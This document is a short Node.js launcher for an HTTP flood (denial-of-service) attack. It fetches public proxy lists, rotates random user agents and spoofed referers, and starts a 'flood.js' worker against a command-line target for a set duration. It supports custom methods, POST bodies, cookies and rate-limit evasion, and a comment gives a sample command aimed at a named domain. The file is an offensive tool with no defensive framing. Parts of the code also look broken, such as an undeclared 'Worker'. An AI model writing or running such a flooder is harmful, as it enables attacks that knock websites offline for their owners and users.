process.setMaxListeners(0);
var postdata = process.argv[6];
var refer = process.argv[9];
const fs = require("fs");
const cluster = require('cluster');
const requestproxy = require('sync-request');
const random_useragent = require('random-useragent');

let res_proxies = requestproxy('GET', 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=4500&country=all&ssl=all&anonymity=all');
let proxy = res_proxies.getBody().toString().match(/.+/g);

const worker = require('worker_threads');
new Worker('./flood.js', {
    workerData: {
        target: process.argv[2].replace(/~/g, '&'),
        proxies: proxy,
        userAgents: [...new Set(random_useragent.getRandom())],
        referers: ["https://google.com", "https://youtube.com", "https://bing.com", "https://yahoo.com", "https://facebook.com", "https://gmail.com", "https://baidu.com", "https://qq.com", "https://reddit.com"],
        duration: process.argv[3] * 1e3,
        opt: {
            method: process.argv[5] || "GET",
            body: postdata.replace(/~/g, '&') !== 'false' ? postdata.replace(/~/g, '&') : false,
            ratelimit: process.argv[7] == 'false' ? false : true,
            cookie: process.argv[8] !== 'false' ? process.argv[8] : false,
            refer: refer !== 'false' ? refer : ""
        },
        mode: process.argv[4]
    }}).on('exit', code => {
    if (code) {
        switch (code) {
            case '6':

                break;
        }
    }
});

/*

POST DATA
node method.js https://exitus.xyz 300 request Checked.txt GET username=%RAND%@~@password=%RAND% false

*/

setTimeout(() => {
        process.exit(1)
}, process.argv[3] * 1000)
